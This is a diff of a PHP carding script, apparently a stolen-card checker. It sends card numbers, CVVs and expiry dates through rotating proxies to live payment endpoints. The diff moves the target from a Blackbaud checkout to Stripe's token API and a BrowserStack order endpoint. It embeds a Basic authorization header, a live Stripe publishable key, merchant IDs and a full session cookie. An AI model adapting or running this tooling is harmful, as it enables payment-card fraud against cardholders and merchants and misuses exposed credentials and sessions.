@@ -112,20 +112,19 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://payments.blackbaud.com/api/Checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: payments.blackbaud.com',
+'authority: api.stripe.com',
 'method: POST',
-'path: /api/Checkout',
+'path: v1/tokens',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.9',
-'authorization: Basic VE9LRU5VU0VSOjRiOTE0NmNmLWE0NjQtNDQxMC04OWI2LWRmNThlNDk4ZGQ0YQ==',
-'content-type: application/json',
-'origin: https://8913.blackbaudhosting.com',
-'referer: https://8913.blackbaudhosting.com/',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
@@ -140,19 +139,19 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"BillingAddress":{"Email":"'.$email.'","Line":"'.$street.'","City":"'.$city.'","State":"'.$state.'","PostCode":"'.$zip.'","Country":"US","Phone":"'.$phone.'"},"Key":"4b9146cf-a464-4410-89b6-df58e498dd4a","MerchantAccountId":"80cc9bfe-5ceb-4cff-9aae-cb683f715f0d","Amount":"11.00","ClientAppName":"Altru Web Forms","Cardholder":"'.$name.' '.$last.'","Note":"Sales Order Cart","UseCaptcha":"False","UseMasterpass":"False","UseVisaCheckout":false,"UseApplePay":false,"Description":"Sales Order Cart","SourceCode":0,"UsePayPal":true,"ClientDomain":"8913.blackbaudhosting.com","PrimaryColor":"","SecondaryColor":"","FontColor":"","FontFamily":"","UseApplePayDonateButton":false}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=b9b7ebe3-3935-4ac0-9fef-c20705d2fffad6de7d&muid=2927481a-0805-4246-b25e-f5f842baddfacd86cd&sid=16d682c1-7e96-4a6f-b99f-3999db402b4a141c1b&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=34033&key=pk_live_40g8bjuzvlOrPg0e4GbbFEGWaD9ehS59BE6vzNgZz59YAHsT5BtwyEBGEWL5PpT2I1qrjSpxS8YOA7bipleQr74Rs000PhWZ1qY&pasted_fields=number');
 
 
 
 $result1 = curl_exec($ch);
-$id = trim(strip_tags(getStr($result1,'"Token": "','"')));
+$id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 # -------------------- [2 REQ] -------------------#
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://payments.blackbaud.com/WebMethods/PaymentServices.ashx?t=c82d9376-e7c4-420d-a392-0287174344cc&action=AUTHTRANS');
+curl_setopt($ch, CURLOPT_URL, 'https://accounts.browserstack.com/orders');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -163,16 +162,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: payments.blackbaud.com',
+'authority: accounts.browserstack.com',
 'method: POST',
-'path: /WebMethods/PaymentServices.ashx?t=c82d9376-e7c4-420d-a392-0287174344cc&action=AUTHTRANS',
+'path: /orders',
 'scheme: https',
-'accept: */*',
+'accept: text/javascript, application/json',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/x-www-form-urlencoded',
-//'cookie: #',
-'origin: https://payments.blackbaud.com',
-'referer: https://payments.blackbaud.com/Pages/Checkout.aspx?t=c82d9376-e7c4-420d-a392-0287174344cc&v=2.0',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: __cf_bm=CeOuVknu5PIqu9aBb6oZQBtJya3ONPHXvTfkhdn3dPI-1649025866-0-AY2NpX49G2kOnodSmU0V7uM6GDqDiQVZrL/0eYFpz9XdiYAUlG6Eg67gsMjt1GLsU/RjcKLUv7/nX+LzlSZTGlQ=; __cfruid=7ddf10857fb6f2ec9bc271333a65b992be70373a-1649025866; tracking_id=f3bf6bf3-b40f-44e2-b55e-d4998b664b60; _rt_uuid=_tJvItOAku9kW0kEdVGXnkIHt; _rt_sid=70JqD0peEYwJd0gVN02PspRVk; moved=1; GAstartTime=1649025882491; bs_deviceId=68f77794-6f3c-ee2b-7e54-5502ac61392a; tft_exp_allocated=signup; _session=7267c456b867e0787369beee95116428; show_freshchat=0; bs_logging_id=5946131; bs_group_id=5863465; bs_user_details={"user_details":{"user_id":5946131,"group_id":5863465},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; downtime_notified={"notifDowntime":false}; previous_session_os=win11; ab_users={"48":105,"_allocation":"58bea3cd-ad63-488e-92d0-97446886d797","54":116,"60":129,"57":123,"40":87,"58":125,"59":127,"55":119,"63":134}; ga_pa_status=npa; p_buy=false; GAlastSentTime=1649026379439',
+'origin: https://www.browserstack.com',
+'referer: https://www.browserstack.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -181,7 +180,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'cardholdername='.$name.'%20'.$last.'&cardnumber='.$cc.'&expiry='.$mes.'%2F'.$ano.'&csc='.$cvv.'&iinHidden=&amount=1.00&originalamount=1.00&firstname=&lastname=&email=soy147n%40yahoo.com&phone=(202)%20405-1548&addr=145%20new%20York%20city&city=New%20York&stateHidden=08f8e7c1-d8b9-4391-84a9-702bbc71f7ef&postal='.$zip.'&countryHidden=d74936d8-7394-4dc2-bba6-424ab5f053cc');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=%2FKh7u0zWHDYtlUAz%2FOp6BN7gI7dAfivAJsqEPQShu6DbPVBOej6yLQuczI5ZS8b332SMCheu%2Fwg9Fz8QA9tG%2Fg%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&cardDetails=null&authenticity_token=7W5zWMiGV3wzr%2BR50nB4hWQ1XDrK0bZ9LUCD%2B9Xn7ADK%2B1it%2Fm75ZxWmaMR30cR2ZbHzh50BYrU2nTjW0p0RXg%3D%3D');
 
 
 $result2 = curl_exec($ch);
